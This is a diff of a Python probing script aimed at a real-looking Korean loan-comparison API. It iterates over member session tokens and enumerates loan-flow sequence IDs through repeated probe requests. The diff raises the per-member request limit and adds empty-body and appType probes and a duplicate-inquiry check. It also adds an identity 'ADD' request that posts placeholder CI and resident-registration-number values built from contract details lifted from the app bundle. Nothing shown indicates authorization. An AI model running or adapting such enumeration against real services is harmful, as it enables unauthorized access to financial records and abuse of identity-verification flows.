@@ -33,7 +33,7 @@ HERE = os.path.dirname(os.path.abspath(__file__))
 BASE = "https://m.okbigyo.com:9443"
 FLOW_TYPES = ("CREDIT", "COMBINE", "MORTGAGE", "ETC", "REHAB_ONE")
 PACE = 0.3
-MAX_REQ_PER_MEMBER = 20
+MAX_REQ_PER_MEMBER = 26
 ADD_DONE = os.path.join(HERE, "flow_add_done.json")
 SEQS_FILE = os.path.join(HERE, "flow_seqs.json")
 HITS_CSV = os.path.join(HERE, "flow_hits.csv")
@@ -159,32 +159,45 @@ def main():
                 print(f"HIT {kind}/{flow} seq={seq_val}", flush=True)
             time.sleep(PACE)
 
-        # 1. no-seq resolution probes
+        # 1. no-seq resolution probes — app posts EMPTY body (bundle:
+        #    getBigyoLoanFlw(flowType){adapter:null}); also try the two
+        #    documented appTypes FOLLOWING/EXISTING.
         for ft in FLOW_TYPES:
-            probe("noseq", ft, {"applyType": "EXISTING", "step": "1"})
-            if mseq:
-                probe("noseq_mseq", ft, {"applyType": "EXISTING", "step": "1", "memberSeq": int(mseq)})
+            probe("noseq_empty", ft, {})
+            probe("noseq_follow", ft, {"appType": "FOLLOWING"})
+            probe("noseq_exist", ft, {"appType": "EXISTING"})
 
         # 2. loReqtNo as seq
         for lr in lreqs[:3]:
             probe("lreq_as_seq", "CREDIT", {"bigyoLoanFlwSeq": lr, "applyType": "EXISTING", "step": "1"})
 
-        # 3. one guarded add to learn seq allocation
-        if mob not in add_done and reqs < MAX_REQ_PER_MEMBER:
+        # 3. check-dup-inquiry: does the session carry recent-inquiry state?
+        if reqs < MAX_REQ_PER_MEMBER:
             reqs += 1
-            body = {"flowType": "CREDIT", "applyType": "NEW", "step": "1",
-                    "memberSeq": int(mseq) if mseq else None,
-                    "carNo": "00하0000", "annualIncom": "0"}
+            st, doc = post(tok, "/bigyo/api/bigyo/check-dup-inquiry", {})
+            journal({"ts": time.strftime("%FT%TZ", time.gmtime()), "mobile": mob,
+                     "kind": "dup_inquiry", "status": st, "doc": doc})
+            print(f"DUPINQ {mob} -> {st} {json.dumps(doc, ensure_ascii=False)[:200]}", flush=True)
+            time.sleep(PACE)
+
+        # 4. step-"-1" identity-group ADD (bundle contract: ci, memberType,
+        #    step=-1, rrNo, txSeqNo, carrier) — old fmt invalidated by marker
+        prev = add_done.get(mob)
+        if (not prev or prev.get("fmt") != "step_-1") and reqs < MAX_REQ_PER_MEMBER:
+            reqs += 1
+            body = {"bigyoLoanFlwSeq": "", "ci": "PROBE_CI_0001", "memberType": "1",
+                    "step": "-1", "rrNo": "7711021000001",
+                    "txSeqNo": "PROBE_TX_0001", "carrier": "KT"}
             st, doc = post(tok, "/bigyo/api/bigyo/bigyoLoanFlw", body)
-            add_done[mob] = {"ts": time.strftime("%FT%TZ", time.gmtime()),
+            add_done[mob] = {"ts": time.strftime("%FT%TZ", time.gmtime()), "fmt": "step_-1",
                              "status": st, "resp": doc if isinstance(doc, dict) else str(doc)[:300]}
-            journal(add_done[mob] | {"mobile": mob, "kind": "add"})
-            print(f"ADD {mob} -> {st} {json.dumps(doc, ensure_ascii=False)[:200]}", flush=True)
+            journal(add_done[mob] | {"mobile": mob, "kind": "add_step_-1"})
+            print(f"ADD-1 {mob} -> {st} {json.dumps(doc, ensure_ascii=False)[:250]}", flush=True)
             if isinstance(doc, dict):
                 cand = doc.get("data")
                 if isinstance(cand, dict) and cand.get("bigyoLoanFlwSeq"):
                     seqs[mob] = str(cand["bigyoLoanFlwSeq"])
-                elif isinstance(cand, (int, str)):
+                elif isinstance(cand, (int, str)) and str(cand).isdigit():
                     seqs[mob] = str(cand)
             time.sleep(PACE)
 
